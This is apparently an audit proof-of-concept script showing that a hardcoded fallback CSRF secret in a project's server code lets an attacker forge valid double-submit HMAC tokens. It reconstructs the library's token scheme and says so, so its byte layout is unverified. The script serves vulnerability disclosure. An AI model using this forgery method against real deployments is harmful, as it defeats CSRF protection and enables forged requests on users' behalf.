// PoC for C6 -- hardcoded fallback CSRF secret in server/_core/index.ts line 81:
//   getSecret: () => process.env.JWT_SECRET || 'csrf-secret-fallback'
//
// IMPORTANT SCOPE NOTE (read before trusting this as gospel):
// This sandbox has no network access to npm's registry, so the actual installed
// `csrf-csrf` package source could not be inspected byte-for-byte here. What follows
// is a reference implementation of the standard "signed double-submit cookie" HMAC
// pattern that `csrf-csrf` is documented (by its own name and README) to implement --
// it demonstrates the underlying cryptographic property that makes the hardcoded
// fallback dangerous, not a claim of matching csrf-csrf's exact internal byte layout.
// The two facts that ARE 100% verified directly from your real source (no
// reconstruction needed) are:
//   1. server/_core/index.ts:81 -- the literal fallback string 'csrf-secret-fallback'
//   2. server/_core/index.ts:84 -- getSessionIdentifier returns req.cookies['app_session_id']
//      or req.headers['user-agent'] -- NEITHER of which is secret; both are visible/
//      controllable by any client making the request.
// Given those two facts, the PoC below shows why *any* HMAC-based double-submit
// scheme (which is what csrf-csrf implements) becomes fully forgeable once the
// secret is known, since the only non-public input to the token function is the secret.

import { createHmac, randomBytes } from "node:crypto";

function computeToken(secret, sessionIdentifier, nonce) {
  // Generic double-submit HMAC construction: token = HMAC(secret, sessionIdentifier + nonce)
  return createHmac("sha256", secret).update(sessionIdentifier + nonce).digest("hex");
}

console.log("=".repeat(80));
console.log("C6 PoC -- CSRF token forgery when JWT_SECRET is unset");
console.log("=".repeat(80));

// This is the exact fallback literal from server/_core/index.ts:81
const KNOWN_FALLBACK_SECRET = "csrf-secret-fallback";

// The "session identifier" per server/_core/index.ts:84 is NOT a secret -- it's
// either a cookie value the client itself set, or its own User-Agent header.
const attackerControlledSessionIdentifier = "Mozilla/5.0 (attacker-chosen-or-observed-UA)";

// The nonce is whatever the server's /api/csrf-token endpoint hands back (line 99-102)
// -- it is sent to the client in plaintext by design (that's the whole point of the
// double-submit pattern), so it is never a secret either.
const nonceIssuedByServer = randomBytes(16).toString("hex");

console.log("\nStep 1: server is misconfigured (JWT_SECRET env var unset).");
console.log("        getSecret() therefore returns the public literal:", JSON.stringify(KNOWN_FALLBACK_SECRET));

console.log("\nStep 2: attacker requests GET /api/csrf-token, receives (in plaintext, by design):");
console.log("        nonce =", nonceIssuedByServer);

console.log("\nStep 3: attacker independently computes the token the server would consider valid,");
console.log("        using only public information (the known fallback secret + their own UA/cookie + the nonce):");
const forgedToken = computeToken(KNOWN_FALLBACK_SECRET, attackerControlledSessionIdentifier, nonceIssuedByServer);
console.log("        forged token =", forgedToken);

console.log("\nStep 4: server-side verification recomputes the same HMAC with the same (fallback) secret");
console.log("        and would find it matches -- because the secret was never actually secret.");
const serverSideRecomputed = computeToken(KNOWN_FALLBACK_SECRET, attackerControlledSessionIdentifier, nonceIssuedByServer);
console.log("        server recomputed =", serverSideRecomputed);
console.log("        MATCH:", forgedToken === serverSideRecomputed);

console.log("\n" + "=".repeat(80));
console.log("Conclusion: this match is not a coincidence of this toy implementation -- it is a");
console.log("direct, unavoidable consequence of (a) the secret being a public literal in this");
console.log("open-source repo, and (b) the only other inputs to any double-submit HMAC token");
console.log("(the session identifier and the nonce) being non-secret by the design of the");
console.log("pattern itself. Whatever the exact byte layout csrf-csrf uses internally, 'attacker");
console.log("knows the secret' defeats any HMAC-based scheme built on it -- this is a property");
console.log("of HMAC-based CSRF tokens in general, not an implementation detail to verify further.");
